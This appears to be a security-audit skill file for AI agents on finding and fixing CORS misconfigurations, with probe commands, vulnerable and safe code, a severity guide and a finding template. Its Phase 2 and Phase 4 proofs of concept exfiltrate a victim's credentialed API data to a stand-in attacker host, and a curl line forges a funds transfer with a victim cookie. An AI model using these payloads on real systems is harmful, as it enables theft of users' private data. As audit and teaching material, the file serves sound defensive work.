---
name: cors-deep-dive
description: >
  Deep-dive CORS misconfiguration detection and remediation skill. Goes beyond
  basic header review to identify wildcard origin reflection, credential leakage
  via Access-Control-Allow-Credentials, null origin allowance (sandbox/file://
  exploitation), preflight bypass techniques, trusted subdomain origin sprawl,
  post-message confusion, CORS-based CSRF, and server-side origin validation
  logic flaws (prefix/suffix matching, regex anchoring). Activate when the user
  asks to "audit CORS", "CORS misconfiguration", "wildcard CORS", "Access-Control-Allow-Origin
  review", "credential CORS leak", "null origin CORS", "preflight bypass", or
  "CORS-based attack".
triggers:
  - "CORS"
  - "CORS misconfiguration"
  - "Access-Control-Allow-Origin"
  - "wildcard CORS"
  - "CORS credentials"
  - "preflight bypass"
  - "null origin"
  - "CORS audit"
  - "origin reflection"
  - "CORS-based CSRF"
  - "postMessage CORS"
version: 1.0.0
author: bug-finder-kit
category: security
risk: safe
tags: "[cors, misconfiguration, credentials, preflight, null-origin, csrf, origin-reflection, api-security]"
date_added: "2026-10-22"
---

# CORS Deep-Dive — Cross-Origin Resource Sharing Misconfiguration Analysis

> CORS misconfigurations are among the most exploitable API vulnerabilities. Browsers
> enforce the Same-Origin Policy (SOP) to protect cookies and credentials, but
> misconfigured CORS policies silently grant attackers the exact same cross-origin
> read access that SOP was designed to prevent.

> This skill covers every CORS attack class beyond basic header inspection, including
> dynamic origin reflection, `null` origin exploitation, credential leakage, preflight
> bypass patterns, and server-side validation logic flaws.

---

## CORS Vulnerability Taxonomy

```
CORS Attack Surface
  ├── Origin Validation Logic Flaws
  │     ├── Wildcard (* ) with credentials (invalid per spec but sometimes misconfigured)
  │     ├── Dynamic origin reflection (any Origin: header echoed back)
  │     ├── Prefix/suffix matching bypass (evil.com → trustedcompanyevil.com)
  │     ├── Regex anchoring failure (attacker-trusted.com matches /trusted\.com/)
  │     └── Null origin allowance (file://, sandboxed iframes, Electron apps)
  ├── Credential Leakage
  │     ├── Access-Control-Allow-Credentials: true + weak origin check
  │     └── Session cookie cross-origin reads
  ├── Preflight Bypass
  │     ├── Simple requests (GET/POST with safe content-types skip preflight)
  │     ├── Custom headers avoided to bypass OPTIONS enforcement
  │     └── Caching preflight responses with long max-age
  ├── Subdomain & Trusted-Domain Sprawl
  │     ├── *.trusted.com allows compromised subdomains
  │     └── Allowlisting partner/CDN domains without XSS review
  └── Cross-Protocol & Special Origins
        ├── HTTP origins allowed on HTTPS APIs
        └── postMessage() origin validation bypass
```

---

## Phase 1 — CORS Header Discovery & Baseline

### 1.1 Enumerate CORS Behaviour

Test how the server responds to different `Origin` header values:

```bash
# 1. No Origin header (same-site browser request baseline)
curl -s -I https://api.example.com/user/profile

# 2. Your own domain
curl -s -I -H "Origin: https://example.com" https://api.example.com/user/profile

# 3. Attacker domain
curl -s -I -H "Origin: https://evil.com" https://api.example.com/user/profile

# 4. Subdomain of trusted domain
curl -s -I -H "Origin: https://evil.trusted.com" https://api.example.com/user/profile

# 5. Null origin (sandbox iframe simulation)
curl -s -I -H "Origin: null" https://api.example.com/user/profile

# 6. HTTP version of the domain
curl -s -I -H "Origin: http://example.com" https://api.example.com/user/profile

# 7. Prefix/suffix manipulation
curl -s -I -H "Origin: https://notexample.com" https://api.example.com/user/profile
curl -s -I -H "Origin: https://example.com.evil.com" https://api.example.com/user/profile
```

**Examine these response headers for each request:**
```
Access-Control-Allow-Origin:
Access-Control-Allow-Credentials:
Access-Control-Allow-Methods:
Access-Control-Allow-Headers:
Access-Control-Max-Age:
Vary:
```

---

## Phase 2 — Wildcard & Origin Reflection Vulnerabilities

### 2.1 Blanket Wildcard (`*`)

A wildcard allows **any origin** to read the response. Alone it is dangerous for
unauthenticated APIs but the browser spec prevents combining `*` with credentials.

```http
# RISKY for unauthenticated public API (leaks all response data cross-origin)
Access-Control-Allow-Origin: *

# INVALID — browser ignores credentials when origin is *
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

> Some servers (especially older or custom implementations) incorrectly combine
> these two headers. **Always test whether cookies are actually sent** by the browser
> even when the server responds with this invalid combination.

### 2.2 Dynamic Origin Reflection

The most exploitable pattern: the server blindly echoes back whatever `Origin`
header the client sends.

```python
# VULNERABLE (Python/Flask): Reflect any origin
@app.after_request
def add_cors(response):
    origin = request.headers.get('Origin')
    if origin:
        response.headers['Access-Control-Allow-Origin'] = origin  # Reflects ANY origin!
        response.headers['Access-Control-Allow-Credentials'] = 'true'
    return response
```

**Exploitation PoC:**
```html
<!-- Hosted on attacker.com -->
<script>
fetch('https://api.victim.com/account/details', {
    credentials: 'include'   // Sends session cookies cross-origin!
})
.then(r => r.json())
.then(data => {
    // Attacker reads victim's private account data including session, PII, keys
    fetch('https://attacker.com/exfil?d=' + encodeURIComponent(JSON.stringify(data)));
});
</script>
```

### 2.3 Detecting Origin Reflection in Code

```bash
# Node.js / Express
grep -rn "req.headers.origin\|req.headers\['origin'\]" src/ | grep -i "allow-origin"

# Python
grep -rn "request.headers.get('Origin')\|request.environ.get('HTTP_ORIGIN')" .

# PHP
grep -rn "\$_SERVER\['HTTP_ORIGIN'\]" . | grep -i "header.*Access-Control"

# Java (Spring)
grep -rn "@CrossOrigin(origins" src/ | grep '"\*"\|\${'

# Go
grep -rn "r.Header.Get(\"Origin\")" . | grep -i "allow-origin"
```

---

## Phase 3 — Origin Validation Logic Flaws

Even when servers implement an origin allowlist, validation logic is frequently
implemented incorrectly.

### 3.1 Prefix Matching Bypass

```python
# VULNERABLE: Trusting any origin that starts with the legitimate domain
allowed = "https://trusted.com"
origin = request.headers.get("Origin", "")

if origin.startswith(allowed):   # Bypass: "https://trusted.com.evil.com" passes!
    response.headers["Access-Control-Allow-Origin"] = origin
```

**Bypass payloads:**
- `https://trusted.com.evil.com` — Domain that starts with trusted.com
- `https://trusted.com@evil.com` — URL userinfo abuse

### 3.2 Suffix Matching Bypass

```python
# VULNERABLE: Trusting any origin that ends with the legitimate domain
if origin.endswith("trusted.com"):  # Bypass: "https://evilnotrusted.com" passes!
    response.headers["Access-Control-Allow-Origin"] = origin
```

**Bypass payloads:**
- `https://attackertrusted.com` — Domain ending with trusted.com
- `https://evil-trusted.com` — Hyphen before domain

### 3.3 Regex Without Anchors

```javascript
// VULNERABLE (Node.js): Regex without start/end anchors
const ALLOWED_PATTERN = /trusted\.com/;
const origin = req.headers.origin;

if (ALLOWED_PATTERN.test(origin)) {  // Bypass: "https://attacker-trusted.com.evil.com" matches!
    res.setHeader('Access-Control-Allow-Origin', origin);
}

// SAFE: Anchored regex with full scheme + domain + optional port
const SAFE_PATTERN = /^https:\/\/(?:[\w-]+\.)?trusted\.com(?::\d+)?$/;
```

### 3.4 Case-Sensitivity Flaws

```bash
# Some servers match case-insensitively, others case-sensitively
curl -H "Origin: HTTPS://TRUSTED.COM" https://api.example.com/endpoint
curl -H "Origin: https://Trusted.Com" https://api.example.com/endpoint
```

### 3.5 Secure Allowlist Implementation

```javascript
// SAFE (Node.js): Exact allowlist match with scheme enforcement
const ALLOWED_ORIGINS = new Set([
    'https://app.trusted.com',
    'https://admin.trusted.com',
    'https://trusted.com'
]);

function setCorsHeaders(req, res) {
    const origin = req.headers.origin;

    if (origin && ALLOWED_ORIGINS.has(origin)) {
        res.setHeader('Access-Control-Allow-Origin', origin);
        res.setHeader('Access-Control-Allow-Credentials', 'true');
        res.setHeader('Vary', 'Origin'); // Critical: prevents proxy caching
    }
    // If origin not in allowlist: omit header entirely — browser blocks request
}
```

---

## Phase 4 — `null` Origin Exploitation

Browsers send `Origin: null` for:
- Requests from `file://` URIs (local HTML files opened on disk)
- `<iframe sandbox>` elements without `allow-same-origin`
- Redirects from opaque origins (data:, blob:)
- Requests from Electron and some mobile apps

If the server allows `null` as an origin:

```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

**Exploitation via sandboxed iframe:**
```html
<!-- Attacker tricks victim into visiting a page with this iframe: -->
<iframe sandbox="allow-scripts" srcdoc="
<script>
fetch('https://api.victim.com/private-data', {credentials: 'include'})
.then(r => r.text())
.then(d => top.location = 'https://attacker.com/exfil?d=' + btoa(d));
</script>
"></iframe>
```

**Detection:**
```bash
curl -s -I -H "Origin: null" https://api.example.com/user/data | grep -i "access-control"
```

**Remediation:** Never include `null` in an origin allowlist.

---

## Phase 5 — Preflight Bypass Techniques

Browsers send a preflight `OPTIONS` request before cross-origin requests that use
non-simple methods (PUT, DELETE, PATCH) or custom headers. "Simple" requests skip preflight entirely.

### 5.1 Simple Request Bypass

GET and POST requests with `Content-Type: application/x-www-form-urlencoded`,
`multipart/form-data`, or `text/plain` skip preflight. If a sensitive API endpoint
accepts these content types, CORS credentials can be sent without triggering OPTIONS.

```bash
# Bypassing preflight on a POST endpoint by using form content type
curl -s -X POST https://api.example.com/transfer \
     -H "Origin: https://attacker.com" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     --cookie "session=victim_token" \
     -d "to=attacker_account&amount=1000"
```

**Remediation:**
- Validate `Content-Type` on the server — reject `application/x-www-form-urlencoded` for state-changing APIs.
- Add a custom header requirement (`X-Requested-With: XMLHttpRequest`) which forces preflight.
- Implement CSRF tokens as the primary state-change defence (complements CORS, not replaced by it).

### 5.2 Cached Preflight Max-Age Abuse

```http
Access-Control-Max-Age: 86400  # 24 hours cached preflight

# If CORS policy changes (allowlist updated), attackers with cached preflight
# responses can continue cross-origin requests for up to 24 hours without
# the new restrictions applying.
```

**Recommendation:** Limit `Access-Control-Max-Age` to 300–600 seconds (5–10 minutes).

---

## Phase 6 — Subdomain & Trusted-Domain Sprawl

### 6.1 Wildcard Subdomain Allowlist Risk

```python
# VULNERABLE: Trusting all subdomains
if re.match(r'https://[^/]+\.trusted\.com$', origin):
    response.headers['Access-Control-Allow-Origin'] = origin
```

If **any** subdomain of `trusted.com` is compromised or hosts XSS:
- `blog.trusted.com` runs an old WordPress with an XSS plugin
- Attacker exploits XSS on `blog.trusted.com` to make credentialed requests to `api.trusted.com`

### 6.2 Cross-Protocol Origin Downgrade

```bash
# API is HTTPS, but also allows HTTP origin
curl -H "Origin: http://trusted.com" https://api.trusted.com/secure-data
# If allowed: attacker on the same network intercepts the HTTP request,
# injects malicious JS, and reads the HTTPS API response.
```

**Remediation:** Never allow HTTP scheme origins for HTTPS APIs.

---

## Phase 7 — `postMessage` Origin Validation

Cross-origin `postMessage` communication shares the same conceptual risks as CORS
but is enforced in JavaScript rather than browser header policy.

```javascript
// VULNERABLE: Accepting messages from any origin
window.addEventListener('message', (event) => {
    // No origin check! Any window or iframe can send malicious instructions.
    processCommand(event.data);
});

// ALSO VULNERABLE: Weak origin check
window.addEventListener('message', (event) => {
    if (event.origin.includes('trusted.com')) { // Bypass: "eviltrusted.com"
        processCommand(event.data);
    }
});

// SAFE: Exact origin check
const ALLOWED_ORIGIN = 'https://app.trusted.com';

window.addEventListener('message', (event) => {
    if (event.origin !== ALLOWED_ORIGIN) {
        console.warn('Rejected message from untrusted origin:', event.origin);
        return;
    }
    processCommand(event.data);
});
```

---

## Phase 8 — CORS Misconfiguration as CSRF Vector

CORS misconfigurations are particularly dangerous when the affected endpoints
perform state-changing operations (money transfers, password changes, data deletion).

**Key distinction from traditional CSRF:**
- Traditional CSRF: browser sends cookies but attacker cannot *read* the response.
- CORS credential leak: attacker's page can *read* the full authenticated response body.

This enables:
1. **Two-step CSRF**: First read a CSRF token from an API endpoint, then use it to forge a protected state-changing request.
2. **Session reconstruction**: Read session/auth tokens from API responses and replay them from a different origin.

---

## Phase 9 — `Vary: Origin` & Proxy Caching Security

When CORS responses vary per origin, the `Vary: Origin` header must be included
to prevent proxy and CDN caches from serving one user's CORS response to another origin.

```http
# VULNERABLE: No Vary header — CDN caches attacker's ACAO: https://evil.com
# and serves it to legitimate users!
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Content-Type: application/json

# SAFE: Vary: Origin ensures each origin gets its own cache key
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://trusted.com
Vary: Origin
Content-Type: application/json
```

---

## Phase 10 — Findings, Severity & Audit Checklist

### Complete CORS Audit Checklist

```
[ ] Origin Validation:
    - Exact allowlist match enforced (not prefix/suffix/regex without anchors)
    - 'null' origin rejected
    - HTTP scheme origins rejected for HTTPS APIs
    - Subdomain wildcards avoided or limited to known-safe subdomains

[ ] Credential Handling:
    - ACAO: * NOT combined with ACAC: true
    - Authenticated endpoints never reflect arbitrary Origin headers
    - Vary: Origin present on all CORS responses

[ ] Preflight:
    - OPTIONS handled correctly with restricted allowed methods/headers
    - Access-Control-Max-Age <= 600 seconds
    - Content-Type enforcement on sensitive POST endpoints

[ ] postMessage:
    - All event listeners check event.origin with exact equality
    - No event.origin.includes() or startsWith() partial checks

[ ] Integration with CSRF Defence:
    - CORS does not replace CSRF tokens for state-changing operations
    - SameSite=Strict or Lax cookies deployed as complementary defence
```

### Severity Guide

| Severity | Condition |
|---|---|
| **Critical** | Arbitrary origin reflected + `Access-Control-Allow-Credentials: true` on authenticated API |
| **Critical** | `null` origin allowed + `Access-Control-Allow-Credentials: true` |
| **High** | Prefix/suffix/regex origin bypass on credentialed endpoint |
| **High** | HTTP scheme origin accepted on HTTPS API with credentials |
| **High** | `postMessage` without origin validation on sensitive handler |
| **Medium** | Wildcard subdomain allowlist covering XSS-vulnerable subdomains |
| **Medium** | Missing `Vary: Origin` causing CDN cache poisoning potential |
| **Low** | `Access-Control-Max-Age` > 3600 seconds |
| **Info** | Wildcard `*` on unauthenticated public API (no credentials) |

### Finding Template

```
### [Severity] CORS Misconfiguration: <Title>
- Location: <API endpoint URL / framework middleware>
- Directive: Access-Control-Allow-Origin / Access-Control-Allow-Credentials
- Flaw: <origin reflection | null origin | prefix bypass | preflight skip>
- Exploitation Scenario:
    1. Attacker hosts malicious page at https://evil.com
    2. Victim visits page with active session cookie
    3. Page issues credentialed fetch() to victim API
    4. Misconfigured CORS allows attacker to read full authenticated response
- Evidence:
    Request:  Origin: https://evil.com
    Response: Access-Control-Allow-Origin: https://evil.com
              Access-Control-Allow-Credentials: true
- Remediation:
    - Replace dynamic reflection with static allowlist
    - Add Vary: Origin header
    - Before & After server-side origin validation code
- Confidence: Confirmed | Likely | Requires Credential Test
```
